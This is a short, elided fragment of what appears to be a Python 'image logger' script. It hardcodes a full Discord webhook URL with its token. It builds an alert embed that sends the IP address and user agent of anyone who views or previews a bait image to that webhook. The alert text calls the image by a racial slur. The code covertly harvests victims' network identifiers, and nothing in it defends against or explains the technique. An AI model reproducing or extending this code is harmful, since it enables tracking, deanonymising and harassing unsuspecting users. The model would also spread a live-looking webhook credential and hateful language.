...
webhook = 'https://discord.com/api/webhooks/1546283022381355038/x854sEJM-EwAJlXqFlHUxzPBL_TflddPrGMXG8qUwl9bBz4LUlb53Yzd5Zp7j_wmAwuH'
...
def prev(ip,uag):
  ...
  "embeds": [
    {
      "title": "Wini2000. Alert!",
      "color": 16711803,
      "description": f"Discord previewed a Nigga Image! You can expect an IP soon.\n\n**IP:** `{ip}`\n**UserAgent:** `Look Below!`\n```yaml\n{uag}```",
      "author": {
        "name": "Wini2000."
      },
      "fields": [
